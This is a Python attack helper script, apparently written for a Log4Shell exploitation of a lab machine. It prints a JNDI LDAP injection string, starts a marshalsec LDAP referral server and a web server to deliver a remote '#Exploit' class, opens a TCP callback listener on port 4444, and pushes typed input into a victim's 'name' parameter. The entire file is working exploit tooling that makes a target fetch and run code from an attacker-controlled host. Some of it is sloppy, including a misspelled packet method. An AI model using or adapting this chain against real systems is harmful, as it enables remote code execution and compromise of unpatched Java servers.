#!/bin/env python3
import os, subprocess, socket, sys, requests
from pathlib import Path
from colorama import Fore, init
from http.server import HTTPServer, SimpleHTTPRequestHandler
from scapy.all import *

CUR_FOLDER = Path(__file__).parent.resolve()
TCP_PORT = 4444
LDAP_PORT = 1389
WEB_SERVER_PORT = 9003
VIC_MACHINE = "10.129.124.163"
VIC_PORT = "8080"
ATTACK_MACHINE = "10.10.14.120"

def ldap_server(userip: str, lport: int):
    sendme = "${jndi:ldap://%s:1389/a}" % (userip)
    print(Fore.GREEN + f"[+] Send me: {sendme}\n")

    url = "http://{}:{}/#Exploit".format(userip, lport) 
    subprocess.run([
        os.path.join(CUR_FOLDER, "conf/jdk1.8.0_181/bin/java"),
        "-cp",
        os.path.join(CUR_FOLDER, "conf/marshalsec-0.0.3-SNAPSHOT-all.jar"),
        "marshalsec.jndi.LDAPRefServer",
        url,
    ])

def WebServer(port: int):
    print(Fore.CYAN + f"[+] Starting Webserver on port {port} http://0.0.0.0:{port}")
    httpd = HTTPServer(('0.0.0.0', port), SimpleHTTPRequestHandler)
    httpd.serve_forever()

def TCP_Listiner(port: int):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))  
    sock.listen(5)  
    print(Fore.BLUE + f"[!] TCP Listening on port {port}")
    connection,address = sock.accept()  
    print(f"[!] New connection from {address}")
    while True:  
        buf = connection.recv(1024)  
        print(buf.decode()) 
        connection.send(buf)    		

def get_requests(ip: str, port: int):
    url =f'http://{ip}:{port}/?name='
    while True:
        param = input("give me input: ")
        print("sends -->", url+param)
        x = requests.get(url+param)
        print(x.text)
def My_wireshrk(pkt):
    pkt.summery()
 

if __name__ == "__main__":
    exe = sys.argv[1]
    
    if exe == "web":
        WebServer(WEB_SERVER_PORT)
    elif exe == "tcp":
        TCP_Listiner(TCP_PORT)
    elif exe == "ldap":
        ldap_server(ATTACK_MACHINE, WEB_SERVER_PORT)
    elif exe == "get":
        get_requests(VIC_MACHINE, VIC_PORT)
    # elif exe == "wire":
    #     sniff(filter=port)
    else:
        print("[!] Invalid argruments:", sys.argv[1])